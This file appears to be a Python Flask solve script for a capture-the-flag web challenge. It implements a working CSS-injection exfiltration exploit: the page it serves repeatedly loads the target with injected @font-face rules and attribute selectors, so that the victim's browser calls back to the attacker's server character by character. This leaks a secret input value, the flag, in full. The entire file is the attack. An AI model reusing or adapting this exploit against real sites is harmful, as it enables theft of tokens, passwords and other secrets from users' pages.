from flask import Flask
import urllib.parse
import string
import time
import os

app = Flask(__name__)
TARGET_URL = "http://localhost:3000/"

# From index.js assertions
FLAG_LENGTH = 68
FLAG_CHARS = "_" + string.ascii_lowercase + string.digits
# We can't match numbers backwards
FLAG_CHARS_BACKWARDS = "_" + string.ascii_lowercase

match_index = 0
last_success = 0
last_match = "_"

@app.route("/m/<s>/")
def character_match(s):
    global last_match
    global last_success
    if s != last_match:
        last_success = time.time()
        last_match = s
        print(last_match)
    flag = f"x3c{{{last_match}}}"
    if len(flag) == FLAG_LENGTH:
        print(f"Got flag: {flag}")
        os._exit(0)
    return ""

@app.route("/m/")
def current_match():
    global last_success
    global last_match
    global match_index
    if time.time() - last_success > 1.5:
        last_success = time.time()
        last_match = "_" + FLAG_CHARS[match_index]
        match_index += 1
    return last_match

@app.route("/")
def idx():
    global last_match
    payload_single = "@font-face{font-family:CHAR;src:url(' + document.location.origin + '/m/PLACEHOLDER/)}input[value*=PLACEHOLDER]{font-family:CHAR}"
    payload = '<a is>}' \
        + "".join([payload_single.replace("CHAR", "P"+x).replace("PLACEHOLDER", x + "PLACEHOLDER") for x in FLAG_CHARS_BACKWARDS]) \
        + "".join([payload_single.replace("CHAR", "S"+x).replace("PLACEHOLDER", "PLACEHOLDER" + x) for x in FLAG_CHARS])
    return f"""
    <iframe></iframe>
    <script>
        let last_match = "";
        let w = window.open('{TARGET_URL}?');
        const payload = '{payload}';
        setInterval(async () => {{
            let new_match = await (await fetch('/m/')).text();
            if (new_match == last_match) return;
            last_match = new_match;
            w.location.href = '{TARGET_URL}?' + payload.replaceAll('PLACEHOLDER', last_match);
        }}, 300);
    </script>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port="8000")
